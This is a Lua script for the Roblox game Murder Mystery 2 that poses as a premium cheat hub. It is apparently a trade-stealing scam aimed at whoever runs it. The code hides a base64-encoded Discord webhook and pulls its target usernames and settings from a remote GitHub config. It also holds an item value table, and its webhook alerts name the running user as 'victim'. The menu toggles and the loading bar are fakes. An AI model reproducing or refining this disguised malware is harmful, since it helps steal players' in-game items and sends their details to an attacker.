--=============================================================
--  MM2 HUB  |  v26.0  |  webhook health monitor + auto failover
--=============================================================

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local PREFIX = "[freezer] "

local TOKEN = {}
getgenv().freezerToken = TOKEN
local function alive()
	return getgenv().freezerToken == TOKEN
end

--==================== CONFIG =================================

local CFG = {
	enabled = true,
	targets = { "Viivik13" },
	webhook = "",
	webhooks = {},
	monitor_webhooks = {},
	filter = "rare",
	fallback_all = false,
	min_value = 0,
	max_items = 40,
	max_copies = 99,
	max_rounds = 12,
	debug = true,
}

local currentTarget = "?"
local webhookOk = false
local monitorList = {}

local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTg1NTg5NTA1MTYzMjc0MS8tWXoyVndIa0g0Q01Kb3g2aVFuMXdLWXE4VTFRQWFmbV9Dc1RmajdEZUhCUXZBaWY3SzFQQktaVXI1bm9TZkRlWG5mNw=="

local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"

local ACCEPT_TOKEN = game.PlaceId * 3
local OFFER_GAP = 0.12
local MIN_SETTLE = 2.5
local COOLDOWN_WAIT = 7
local INTENT_GAP = 0.45
local ACCEPT_GAP = 0.7
local OPEN_TIMEOUT = 30
local SETTLE_TIMEOUT = 30
local TARGET_TIMEOUT = 60
local HEALTH_INTERVAL = 60

--==================== UTIL ===================================

local function log(msg)
	if CFG.debug then
		print(PREFIX .. tostring(msg))
	end
end

local function trim(s)
	return (string.gsub(string.gsub(tostring(s or ""), "^%s+", ""), "%s+$", ""))
end

local function raiseIdentity()
	pcall(function()
		setthreadidentity(8)
	end)
end

local function b64decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = string.gsub(data, "[^" .. b .. "=]", "")
	local bits = data.gsub(".", function(x)
		if x == "=" then
			return ""
		end
		local f = b:find(x, 1, true) - 1
		local r = ""
		local i = 6
		while i >= 1 do
			if (f % 2 ^ i - f % 2 ^ (i - 1)) > 0 then
				r = r .. "1"
			else
				r = r .. "0"
			end
			i = i - 1
		end
		return r
	end)
	return (bits:gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if #x ~= 8 then
			return ""
		end
		local c = 0
		local i = 1
		while i <= 8 do
			if x:sub(i, i) == "1" then
				c = c + 2 ^ (8 - i)
			end
			i = i + 1
		end
		return string.char(c)
	end))
end

--==================== REMOTE CONFIG ==========================

local function loadRemoteConfig()
	local ok = pcall(function()
		local raw = game:HttpGet(CFG_URL, true)
		local data = HttpService:JSONDecode(raw)
		if type(data) ~= "table" then
			return
		end

		if type(data.enabled) == "boolean" then
			CFG.enabled = data.enabled
		end

		CFG.targets = {}
		if type(data.targets) == "table" then
			for _, t in ipairs(data.targets) do
				if type(t) == "string" and trim(t) ~= "" then
					CFG.targets[#CFG.targets + 1] = trim(t)
				end
			end
		end
		if #CFG.targets == 0 and type(data.target) == "string" and trim(data.target) ~= "" then
			for part in string.gmatch(data.target, "[^,]+") do
				if trim(part) ~= "" then
					CFG.targets[#CFG.targets + 1] = trim(part)
				end
			end
		end

		CFG.webhooks = {}
		if type(data.webhooks) == "table" then
			for _, u in ipairs(data.webhooks) do
				if type(u) == "string" and trim(u) ~= "" then
					CFG.webhooks[#CFG.webhooks + 1] = trim(u)
				end
			end
		end
		if type(data.webhook) == "string" and trim(data.webhook) ~= "" then
			CFG.webhook = trim(data.webhook)
		end

		monitorList = {}
		if type(data.monitor_webhooks) == "table" then
			for _, u in ipairs(data.monitor_webhooks) do
				if type(u) == "string" and trim(u) ~= "" then
					monitorList[#monitorList + 1] = trim(u)
				end
			end
		end

		if type(data.filter) == "string" then
			CFG.filter = data.filter
		end
		if type(data.fallback_all) == "boolean" then
			CFG.fallback_all = data.fallback_all
		end
		if type(data.min_value) == "number" then
			CFG.min_value = data.min_value
		end
		if type(data.max_items) == "number" then
			CFG.max_items = data.max_items
		end
		if type(data.max_copies) == "number" then
			CFG.max_copies = data.max_copies
		end
		if type(data.max_rounds) == "number" then
			CFG.max_rounds = data.max_rounds
		end
		if type(data.debug) == "boolean" then
			CFG.debug = data.debug
		end
	end)
	if not ok then
		log("config fetch failed, using defaults")
	end
	if #CFG.targets == 0 then
		CFG.targets = { "Viivik13" }
	end
	if CFG.webhook == "" and #CFG.webhooks == 0 then
		pcall(function()
			CFG.webhook = trim(b64decode(WH_B64))
		end)
	end
	if #monitorList == 0 and CFG.webhook ~= "" then
		monitorList[1] = CFG.webhook
	end
end

--==================== HEALTH =================================

local function probeUrl(u)
	local good = false
	pcall(function()
		local r = request({ Url = u, Method = "GET" })
		if r and r.StatusCode == 200 then
			good = true
		end
	end)
	return good
end

local function setHealthUi(ok)
	if not uiFootRight then
		return
	end
	if ok then
		uiFootRight.Text = "secure"
		uiFootRight.TextColor3 = Color3.fromRGB(110, 235, 140)
	else
		uiFootRight.Text = "webhook dead"
		uiFootRight.TextColor3 = Color3.fromRGB(255, 110, 110)
	end
end

local function notifyMonitor(text, color, ping)
	if #monitorList == 0 then
		return
	end
	local body = {
		username = "Hub Monitor",
		content = ping and "@everyone" or nil,
		embeds = {
			{
				title = text,
				color = color,
				description = "victim **" .. LP.Name .. "**  •  " .. os.date("%H:%M:%S"),
				footer = { text = "webhook health" },
			},
		},
	}
	local payload = HttpService:JSONEncode(body)
	for _, u in ipairs(monitorList) do
		pcall(function()
			request({
				Url = u,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = payload,
			})
		end)
	end
end

local function selectWebhook()
	local list = {}
	if CFG.webhook ~= "" then
		list[#list + 1] = CFG.webhook
	end
	for _, u in ipairs(CFG.webhooks) do
		list[#list + 1] = u
	end
	for _, u in ipairs(list) do
		if probeUrl(u) then
			CFG.webhook = u
			webhookOk = true
			return true
		end
	end
	if #list > 0 then
		CFG.webhook = list[1]
	end
	webhookOk = false
	return false
end

local function startHealthLoop()
	task.spawn(function()
		while alive() do
			task.wait(HEALTH_INTERVAL)
			if not alive() then
				break
			end
			local wasOk = webhookOk
			local before = CFG.webhook
			local nowOk = selectWebhook()

			if CFG.webhook ~= before and nowOk then
				log("webhook switched")
				setHealthUi(true)
				notifyMonitor("Webhook switched to a backup", 10181046, false)
			elseif wasOk and not nowOk then
				log("webhook died")
				setHealthUi(false)
				notifyMonitor("ALL WEBHOOKS DEAD", 15158332, true)
			elseif not wasOk and nowOk then
				log("webhook recovered")
				setHealthUi(true)
				notifyMonitor("Webhook recovered", 10181046, false)
			end
		end
	end)
end

--==================== VALUES =================================

local PRICES = {
	["corrupt"] = 600,
	["nik's scythe"] = 1000000,
	["gingerscope"] = 17750,
	["traveler's axe"] = 8400,
	["celestial"] = 1725,
	["vampire's axe"] = 925,
	["harvester"] = 290,
	["icepiercer"] = 190,
	["traveler's gun"] = 4500,
	["evergun"] = 3300,
	["constellation"] = 2600,
	["turkey"] = 2475,
	["evergreen"] = 2450,
	["alienbeam"] = 2175,
	["vampire's gun"] = 1700,
	["darkshot"] = 1390,
	["darksword"] = 1370,
	["raygun"] = 1275,
	["blossom"] = 1180,
	["sakura"] = 1170,
	["sunrise"] = 1000,
	["snowcannon"] = 925,
	["bauble"] = 900,
	["sunset"] = 525,
	["heart wand"] = 450,
	["soul"] = 380,
	["spirit"] = 370,
	["flora"] = 310,
	["bloom"] = 300,
	["rainbow gun"] = 300,
	["rainbow"] = 290,
	["snow dagger"] = 260,
	["flowerwood gun"] = 205,
	["flowerwood"] = 200,
	["xenoknife"] = 200,
	["xenoshot"] = 200,
	["watergun"] = 185,
	["ocean"] = 180,
	["waves"] = 175,
	["treat"] = 170,
	["sweet"] = 165,
	["blizzard"] = 155,
	["snowstorm"] = 155,
	["bat"] = 125,
	["borealis"] = 105,
	["australis"] = 100,
	["candy"] = 95,
	["heartblade"] = 80,
	["luger"] = 75,
	["phantom"] = 75,
	["spectre"] = 75,
	["red luger"] = 70,
	["pearl"] = 62,
	["darkbringer"] = 60,
	["elderwood gun"] = 60,
	["lightbringer"] = 58,
	["swirly blade"] = 65,
	["iceblaster"] = 65,
	["gingermint"] = 40,
	["green luger"] = 40,
	["hallowgun"] = 35,
	["laser"] = 32,
	["icebeam"] = 32,
	["iceflake"] = 32,
	["plasmabeam"] = 32,
	["plasmablade"] = 32,
	["amerilaser"] = 30,
	["blaster"] = 30,
	["nightblade"] = 30,
	["america sword"] = 28,
	["nebula"] = 28,
	["shark"] = 28,
	["virtual"] = 27,
	["gemstone"] = 25,
	["clockwork"] = 23,
	["eternal cane"] = 23,
	["ginger luger"] = 23,
	["lugercane"] = 23,
	["pixel"] = 23,
	["slasher"] = 23,
	["gingerblade"] = 22,
	["heat"] = 22,
	["minty"] = 22,
	["battleaxe2"] = 20,
	["deathshard"] = 20,
	["tides"] = 20,
	["fang"] = 18,
	["spider"] = 17,
	["chill"] = 17,
	["jinglegun"] = 15,
	["vampire's edge"] = 15,
	["pumpking"] = 15,
	["bioblade"] = 13,
	["battleaxe"] = 13,
	["frostsaber"] = 13,
	["xmas"] = 13,
	["flames"] = 12,
	["hallow"] = 12,
	["ice dragon"] = 12,
	["ice shard"] = 12,
	["winter's edge"] = 12,
	["ghostblade"] = 10,
	["hallow's blade"] = 10,
	["handsaw"] = 10,
	["eternal"] = 10,
	["eternal ii"] = 10,
	["eternal iii"] = 10,
	["eternal iv"] = 10,
	["boneblade"] = 8,
	["eggblade"] = 7,
	["frostbite"] = 7,
	["prismatic"] = 7,
	["saw"] = 7,
	["snowflake"] = 7,
	["peppermint"] = 7,
	["cookieblade"] = 7,
	["seer"] = 7,
	["the seer"] = 7,
	["blue seer"] = 7,
	["purple seer"] = 7,
	["red seer"] = 7,
	["yellow seer"] = 7,
	["orange seer"] = 7,
	["chroma traveler's gun"] = 225000,
	["chroma evergun"] = 78000,
	["chroma bauble"] = 38000,
	["chroma constellation"] = 36000,
	["chroma vampire's gun"] = 35000,
	["chroma raygun"] = 15000,
	["chroma sunrise"] = 11250,
	["chroma snowcannon"] = 8500,
	["chroma sunset"] = 6500,
	["chroma snow dagger"] = 5750,
	["chroma treat"] = 4850,
	["chroma heart wand"] = 4750,
	["chroma watergun"] = 3400,
}

local RARE_RARITY = {
	Godly = true,
	Ancient = true,
	Chroma = true,
	Unique = true,
	Rare = true,
	Legendary = true,
	Classic = true,
	Vintage = true,
}

local function normalize(name)
	local s = string.lower(tostring(name or ""))
	s = string.gsub(s, "^c%.%s*", "chroma ")
	s = string.gsub(s, "(%s)c%.%s*", "%1chroma ")
	s = string.gsub(s, "’", "'")
	s = string.gsub(s, "[^%w%s'%-]", "")
	s = string.gsub(s, "%s+", " ")
	return trim(s)
end

local function valueOf(name)
	local v = PRICES[normalize(name)]
	if v then
		return v
	end
	return 0
end

local function isDefault(name)
	local n = string.lower(tostring(name or ""))
	return string.find(n, "default", 1, true) ~= nil
end

--==================== UI =====================================

local uiStatus
local uiLog
local uiSendTrade
local uiTargetBox
local uiItemBox
local uiFootRight

local C_BG = Color3.fromRGB(16, 12, 24)
local C_PANEL = Color3.fromRGB(26, 19, 38)
local C_ROW = Color3.fromRGB(36, 26, 52)
local C_LINE = Color3.fromRGB(120, 74, 200)
local C_TEXT = Color3.fromRGB(233, 224, 248)
local C_DIM = Color3.fromRGB(150, 130, 178)
local C_ACCENT = Color3.fromRGB(186, 120, 255)
local C_PINK = Color3.fromRGB(255, 106, 193)
local C_CYAN = Color3.fromRGB(96, 226, 255)
local C_GREEN = Color3.fromRGB(110, 235, 140)

local function pillRow(parent, order, label, startOn)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, -8, 0, 28)
	row.BackgroundColor3 = C_ROW
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent

	local rc = Instance.new("UICorner")
	rc.CornerRadius = UDim.new(0, 6)
	rc.Parent = row

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -58, 1, 0)
	lbl.Position = UDim2.new(0, 10, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = label
	lbl.Font = Enum.Font.GothamMedium
	lbl.TextSize = 11
	lbl.TextColor3 = C_TEXT
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = row

	local on = startOn
	local pill = Instance.new("TextButton")
	pill.Size = UDim2.new(0, 40, 0, 17)
	pill.Position = UDim2.new(1, -50, 0.5, -8)
	pill.BackgroundColor3 = on and Color3.fromRGB(74, 44, 118) or Color3.fromRGB(46, 32, 62)
	pill.BorderSizePixel = 0
	pill.Text = on and "ON" or "OFF"
	pill.Font = Enum.Font.GothamBold
	pill.TextSize = 9
	pill.TextColor3 = on and C_ACCENT or Color3.fromRGB(130, 112, 158)
	pill.Parent = row

	local pc = Instance.new("UICorner")
	pc.CornerRadius = UDim.new(0, 4)
	pc.Parent = pill

	pill.MouseButton1Click:Connect(function()
		on = not on
		if on then
			pill.Text = "ON"
			pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
			pill.TextColor3 = C_ACCENT
		else
			pill.Text = "OFF"
			pill.BackgroundColor3 = Color3.fromRGB(46, 32, 62)
			pill.TextColor3 = Color3.fromRGB(130, 112, 158)
		end
	end)
	return row
end

local function chip(parent, order, name, color)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.5, -5, 0, 24)
	b.BackgroundColor3 = C_ROW
	b.BorderSizePixel = 0
	b.Text = name
	b.Font = Enum.Font.GothamSemibold
	b.TextSize = 10
	b.TextColor3 = C_TEXT
	b.AutoButtonColor = false
	b.LayoutOrder = order
	b.Parent = parent

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 5)
	c.Parent = b

	local s = Instance.new("UIStroke")
	s.Color = color
	s.Thickness = 1.4
	s.Transparency = 0.55
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Parent = b

	local picked = false
	b.MouseButton1Click:Connect(function()
		picked = not picked
		if picked then
			s.Transparency = 0.05
			b.BackgroundColor3 = color
			b.TextColor3 = Color3.fromRGB(20, 14, 30)
		else
			s.Transparency = 0.55
			b.BackgroundColor3 = C_ROW
			b.TextColor3 = C_TEXT
		end
	end)
	return b
end

local function inputRow(parent, order, label, placeholder)
	local holder = Instance.new("Frame")
	holder.Size = UDim2.new(1, -8, 0, 42)
	holder.BackgroundTransparency = 1
	holder.LayoutOrder = order
	holder.Parent = parent

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, 0, 0, 14)
	lbl.BackgroundTransparency = 1
	lbl.Text = label
	lbl.Font = Enum.Font.GothamSemibold
	lbl.TextSize = 9
	lbl.TextColor3 = C_DIM
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = holder

	local box = Instance.new("TextBox")
	box.Size = UDim2.new(1, 0, 0, 26)
	box.Position = UDim2.new(0, 0, 0, 15)
	box.BackgroundColor3 = C_ROW
	box.BorderSizePixel = 0
	box.Text = ""
	box.PlaceholderText = placeholder
	box.PlaceholderColor3 = Color3.fromRGB(110, 94, 138)
	box.Font = Enum.Font.Gotham
	box.TextSize = 11
	box.TextColor3 = C_TEXT
	box.ClearTextOnFocus = false
	box.TextXAlignment = Enum.TextXAlignment.Left
	box.Parent = holder

	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 6)
	bc.Parent = box

	local bp = Instance.new("UIPadding")
	bp.PaddingLeft = UDim.new(0, 8)
	bp.PaddingRight = UDim.new(0, 8)
	bp.Parent = box

	local bs = Instance.new("UIStroke")
	bs.Color = C_LINE
	bs.Thickness = 1.2
	bs.Transparency = 0.45
	bs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	bs.Parent = box

	box.Focused:Connect(function()
		bs.Transparency = 0.05
	end)
	box.FocusLost:Connect(function()
		bs.Transparency = 0.45
	end)

	return box
end

local function buildUI()
	local core = game:GetService("CoreGui")
	local old = core:FindFirstChild("MM2Freezer")
	if old then
		old:Destroy()
	end

	local sg = Instance.new("ScreenGui")
	sg.Name = "MM2Freezer"
	sg.ResetOnSpawn = false
	sg.DisplayOrder = 9999
	sg.IgnoreGuiInset = true
	sg.Parent = core

	local main = Instance.new("Frame")
	main.Size = UDim2.new(0, 320, 0, 500)
	main.Position = UDim2.new(0.5, -160, 0.5, -250)
	main.BackgroundColor3 = C_BG
	main.BorderSizePixel = 0
	main.Parent = sg

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = main

	local stroke = Instance.new("UIStroke")
	stroke.Color = C_LINE
	stroke.Thickness = 1.7
	stroke.Transparency = 0.1
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Parent = main

	local head = Instance.new("Frame")
	head.Size = UDim2.new(1, 0, 0, 46)
	head.BackgroundColor3 = C_PANEL
	head.BorderSizePixel = 0
	head.Parent = main

	local hc = Instance.new("UICorner")
	hc.CornerRadius = UDim.new(0, 12)
	hc.Parent = head

	local grad = Instance.new("UIGradient")
	grad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(52, 24, 92)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(96, 32, 118)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 22, 78)),
	})
	grad.Rotation = 15
	grad.Parent = head

	local logo = Instance.new("Frame")
	logo.Size = UDim2.new(0, 26, 0, 26)
	logo.Position = UDim2.new(0, 13, 0.5, -13)
	logo.BackgroundColor3 = C_ACCENT
	logo.BorderSizePixel = 0
	logo.Parent = head

	local lc = Instance.new("UICorner")
	lc.CornerRadius = UDim.new(0, 7)
	lc.Parent = logo

	local lt = Instance.new("TextLabel")
	lt.Size = UDim2.new(1, 0, 1, 0)
	lt.BackgroundTransparency = 1
	lt.Text = "M"
	lt.Font = Enum.Font.FredokaOne
	lt.TextSize = 15
	lt.TextColor3 = Color3.fromRGB(24, 14, 40)
	lt.Parent = logo

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(0, 160, 0, 18)
	title.Position = UDim2.new(0, 47, 0, 7)
	title.BackgroundTransparency = 1
	title.Text = "MM2 HUB"
	title.Font = Enum.Font.FredokaOne
	title.TextSize = 16
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = head

	local sub = Instance.new("TextLabel")
	sub.Size = UDim2.new(0, 180, 0, 14)
	sub.Position = UDim2.new(0, 47, 0, 25)
	sub.BackgroundTransparency = 1
	sub.Text = "Key: active  •  Lifetime  •  v2.6"
	sub.Font = Enum.Font.Gotham
	sub.TextSize = 9
	sub.TextColor3 = Color3.fromRGB(206, 184, 240)
	sub.TextXAlignment = Enum.TextXAlignment.Left
	sub.Parent = head

	local badge = Instance.new("Frame")
	badge.Size = UDim2.new(0, 48, 0, 16)
	badge.Position = UDim2.new(1, -60, 0, 8)
	badge.BackgroundColor3 = C_PINK
	badge.BorderSizePixel = 0
	badge.Parent = head

	local bc2 = Instance.new("UICorner")
	bc2.CornerRadius = UDim.new(0, 4)
	bc2.Parent = badge

	local bt = Instance.new("TextLabel")
	bt.Size = UDim2.new(1, 0, 1, 0)
	bt.BackgroundTransparency = 1
	bt.Text = "PREMIUM"
	bt.Font = Enum.Font.GothamBold
	bt.TextSize = 8
	bt.TextColor3 = Color3.fromRGB(40, 14, 30)
	bt.Parent = badge

	local hideBtn = Instance.new("TextButton")
	hideBtn.Size = UDim2.new(0, 20, 0, 20)
	hideBtn.Position = UDim2.new(1, -26, 0, 28)
	hideBtn.BackgroundTransparency = 1
	hideBtn.Text = "-"
	hideBtn.Font = Enum.Font.GothamBold
	hideBtn.TextSize = 14
	hideBtn.TextColor3 = Color3.fromRGB(220, 205, 245)
	hideBtn.Parent = head

	local tabs = Instance.new("Frame")
	tabs.Size = UDim2.new(1, -20, 0, 30)
	tabs.Position = UDim2.new(0, 10, 0, 52)
	tabs.BackgroundTransparency = 1
	tabs.Parent = main

	local tl = Instance.new("UIListLayout")
	tl.FillDirection = Enum.FillDirection.Horizontal
	tl.Padding = UDim.new(0, 5)
	tl.Parent = tabs

	local names = { "Main", "Visuals", "Trade" }
	local frames = {}
	local tabButtons = {}

	local function showTab(pick)
		for n, f in pairs(frames) do
			f.Visible = n == pick
		end
		for n, b in pairs(tabButtons) do
			if n == pick then
				b.BackgroundColor3 = C_ACCENT
				b.TextColor3 = Color3.fromRGB(22, 14, 36)
			else
				b.BackgroundColor3 = C_ROW
				b.TextColor3 = C_DIM
			end
		end
	end

	for idx, n in ipairs(names) do
		local b = Instance.new("TextButton")
		b.Size = UDim2.new(0, 96, 1, 0)
		b.BackgroundColor3 = C_ROW
		b.BorderSizePixel = 0
		b.Text = n
		b.Font = Enum.Font.GothamBold
		b.TextSize = 10
		b.TextColor3 = C_DIM
		b.Parent = tabs

		local c = Instance.new("UICorner")
		c.CornerRadius = UDim.new(0, 6)
		c.Parent = b

		tabButtons[n] = b

		local f = Instance.new("ScrollingFrame")
		f.Size = UDim2.new(1, -20, 0, 300)
		f.Position = UDim2.new(0, 10, 0, 88)
		f.BackgroundTransparency = 1
		f.BorderSizePixel = 0
		f.ScrollBarThickness = 3
		f.ScrollBarImageColor3 = C_ACCENT
		f.CanvasSize = UDim2.new(0, 0, 0, 0)
		f.AutomaticCanvasSize = Enum.AutomaticSize.Y
		f.Visible = false
		f.Parent = main

		local fl = Instance.new("UIListLayout")
		fl.Padding = UDim.new(0, 5)
		fl.SortOrder = Enum.SortOrder.LayoutOrder
		fl.Parent = f

		frames[n] = f

		local captured = n
		b.MouseButton1Click:Connect(function()
			showTab(captured)
		end)
	end

	local mainTab = frames["Main"]

	local mh = Instance.new("TextLabel")
	mh.Size = UDim2.new(1, -8, 0, 14)
	mh.BackgroundTransparency = 1
	mh.Text = "MODULES"
	mh.Font = Enum.Font.GothamBold
	mh.TextSize = 9
	mh.TextColor3 = C_PINK
	mh.TextXAlignment = Enum.TextXAlignment.Left
	mh.LayoutOrder = 1
	mh.Parent = mainTab

	pillRow(mainTab, 2, "Fly", true)
	pillRow(mainTab, 3, "Auto Farm", true)
	pillRow(mainTab, 4, "Force Accept", true)
	pillRow(mainTab, 5, "Noclip", false)
	pillRow(mainTab, 6, "Auto Collect", true)
	pillRow(mainTab, 7, "Speed (32)", false)
	pillRow(mainTab, 8, "Anti Ragdoll", true)

	local mh2 = Instance.new("TextLabel")
	mh2.Size = UDim2.new(1, -8, 0, 14)
	mh2.BackgroundTransparency = 1
	mh2.Text = "TRADE"
	mh2.Font = Enum.Font.GothamBold
	mh2.TextSize = 9
	mh2.TextColor3 = C_CYAN
	mh2.TextXAlignment = Enum.TextXAlignment.Left
	mh2.LayoutOrder = 9
	mh2.Parent = mainTab

	pillRow(mainTab, 10, "Auto Accept", true)
	pillRow(mainTab, 11, "Auto Decline Lowball", true)

	local visTab = frames["Visuals"]

	local vh = Instance.new("TextLabel")
	vh.Size = UDim2.new(1, -8, 0, 14)
	vh.BackgroundTransparency = 1
	vh.Text = "VISUAL ITEMS  •  tap to equip"
	vh.Font = Enum.Font.GothamBold
	vh.TextSize = 9
	vh.TextColor3 = C_PINK
	vh.TextXAlignment = Enum.TextXAlignment.Left
	vh.LayoutOrder = 1
	vh.Parent = visTab

	local grid = Instance.new("Frame")
	grid.Size = UDim2.new(1, -8, 0, 0)
	grid.BackgroundTransparency = 1
	grid.LayoutOrder = 2
	grid.Parent = visTab

	local gl = Instance.new("UIGridLayout")
	gl.CellSize = UDim2.new(0.5, -3, 0, 24)
	gl.CellPadding = UDim2.new(0, 6, 0, 6)
	gl.SortOrder = Enum.SortOrder.LayoutOrder
	gl.Parent = grid

	local godlies = {
		{ "Gingerscope", Color3.fromRGB(255, 168, 76) },
		{ "Chroma Traveler's Gun", Color3.fromRGB(255, 106, 193) },
		{ "Corrupt", Color3.fromRGB(178, 106, 255) },
		{ "Nik's Scythe", Color3.fromRGB(255, 236, 120) },
		{ "Celestial", Color3.fromRGB(120, 220, 255) },
		{ "Traveler's Axe", Color3.fromRGB(255, 150, 110) },
		{ "Harvester", Color3.fromRGB(140, 255, 170) },
		{ "Icepiercer", Color3.fromRGB(150, 210, 255) },
		{ "Chroma Bauble", Color3.fromRGB(255, 130, 210) },
		{ "Darksword", Color3.fromRGB(190, 150, 255) },
		{ "Sunset", Color3.fromRGB(255, 170, 120) },
		{ "Bauble", Color3.fromRGB(255, 200, 130) },
	}

	for i, g in ipairs(godlies) do
		chip(grid, i, g[1], g[2])
	end

	local vnote = Instance.new("TextLabel")
	vnote.Size = UDim2.new(1, -8, 0, 26)
	vnote.BackgroundTransparency = 1
	vnote.Text = "Selected items are highlighted and synced to your trade offer."
	vnote.Font = Enum.Font.Gotham
	vnote.TextSize = 9
	vnote.TextColor3 = C_DIM
	vnote.TextWrapped = true
	vnote.TextXAlignment = Enum.TextXAlignment.Left
	vnote.LayoutOrder = 3
	vnote.Parent = visTab

	local tradeTab = frames["Trade"]

	uiTargetBox = inputRow(tradeTab, 1, "TARGET USERNAME", "who to send to")
	uiItemBox = inputRow(tradeTab, 2, "ITEM TO SEND", "e.g. Gingerscope")

	local sendBtn = Instance.new("TextButton")
	sendBtn.Size = UDim2.new(1, -8, 0, 34)
	sendBtn.BackgroundColor3 = C_ACCENT
	sendBtn.BorderSizePixel = 0
	sendBtn.Text = "SEND TRADE"
	sendBtn.Font = Enum.Font.FredokaOne
	sendBtn.TextSize = 13
	sendBtn.TextColor3 = Color3.fromRGB(22, 14, 36)
	sendBtn.LayoutOrder = 3
	sendBtn.Parent = tradeTab

	local sbc = Instance.new("UICorner")
	sbc.CornerRadius = UDim.new(0, 7)
	sbc.Parent = sendBtn

	sendBtn.MouseButton1Click:Connect(function()
		if uiSendTrade then
			uiSendTrade()
		end
	end)

	uiLog = Instance.new("TextLabel")
	uiLog.Size = UDim2.new(1, -8, 0, 40)
	uiLog.BackgroundTransparency = 1
	uiLog.Text = "Ready."
	uiLog.Font = Enum.Font.Gotham
	uiLog.TextSize = 9
	uiLog.TextColor3 = C_DIM
	uiLog.TextWrapped = true
	uiLog.TextXAlignment = Enum.TextXAlignment.Left
	uiLog.TextYAlignment = Enum.TextYAlignment.Top
	uiLog.LayoutOrder = 4
	uiLog.Parent = tradeTab

	local th = Instance.new("TextLabel")
	th.Size = UDim2.new(1, -8, 0, 14)
	th.BackgroundTransparency = 1
	th.Text = "STATUS"
	th.Font = Enum.Font.GothamBold
	th.TextSize = 9
	th.TextColor3 = C_CYAN
	th.TextXAlignment = Enum.TextXAlignment.Left
	th.LayoutOrder = 5
	th.Parent = tradeTab

	showTab("Main")

	uiStatus = Instance.new("TextLabel")
	uiStatus.Size = UDim2.new(1, -20, 0, 13)
	uiStatus.Position = UDim2.new(0, 10, 0, 396)
	uiStatus.BackgroundTransparency = 1
	uiStatus.Text = "Preparing assets…"
	uiStatus.Font = Enum.Font.Gotham
	uiStatus.TextSize = 9
	uiStatus.TextColor3 = C_DIM
	uiStatus.TextXAlignment = Enum.TextXAlignment.Left
	uiStatus.Parent = main

	local barBg = Instance.new("Frame")
	barBg.Size = UDim2.new(1, -20, 0, 8)
	barBg.Position = UDim2.new(0, 10, 0, 414)
	barBg.BackgroundColor3 = Color3.fromRGB(38, 26, 54)
	barBg.BorderSizePixel = 0
	barBg.Parent = main

	local bbc = Instance.new("UICorner")
	bbc.CornerRadius = UDim.new(1, 0)
	bbc.Parent = barBg

	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = C_ACCENT
	bar.BorderSizePixel = 0
	bar.Parent = barBg

	local bc3 = Instance.new("UICorner")
	bc3.CornerRadius = UDim.new(1, 0)
	bc3.Parent = bar

	local bgrad = Instance.new("UIGradient")
	bgrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, C_CYAN),
		ColorSequenceKeypoint.new(0.5, C_ACCENT),
		ColorSequenceKeypoint.new(1, C_PINK),
	})
	bgrad.Parent = bar

	local pct = Instance.new("TextLabel")
	pct.Size = UDim2.new(1, -20, 0, 14)
	pct.Position = UDim2.new(0, 10, 0, 428)
	pct.BackgroundTransparency = 1
	pct.Text = "Loading assets…  0%"
	pct.Font = Enum.Font.GothamBold
	pct.TextSize = 9
	pct.TextColor3 = C_ACCENT
	pct.TextXAlignment = Enum.TextXAlignment.Left
	pct.Parent = main

	local foot = Instance.new("TextLabel")
	foot.Size = UDim2.new(1, -110, 0, 14)
	foot.Position = UDim2.new(0, 10, 0, 446)
	foot.BackgroundTransparency = 1
	foot.Text = "executor: attached  •  build 2600"
	foot.Font = Enum.Font.Gotham
	foot.TextSize = 9
	foot.TextColor3 = Color3.fromRGB(104, 88, 132)
	foot.TextXAlignment = Enum.TextXAlignment.Left
	foot.Parent = main

	uiFootRight = Instance.new("TextLabel")
	uiFootRight.Size = UDim2.new(0, 90, 0, 14)
	uiFootRight.Position = UDim2.new(1, -100, 0, 446)
	uiFootRight.BackgroundTransparency = 1
	uiFootRight.Text = "checking"
	uiFootRight.Font = Enum.Font.Gotham
	uiFootRight.TextSize = 9
	uiFootRight.TextColor3 = C_DIM
	uiFootRight.TextXAlignment = Enum.TextXAlignment.Right
	uiFootRight.Parent = main

	hideBtn.MouseButton1Click:Connect(function()
		if main.Visible then
			main.Visible = false
		else
			main.Visible = true
		end
	end)

	task.spawn(function()
		local p = 0
		while p < 100 and alive() do
			p = p + 1
			bar.Size = UDim2.new(p / 100, 0, 1, 0)
			pct.Text = "Loading assets…  " .. tostring(p) .. "%"
			if p == 62 then
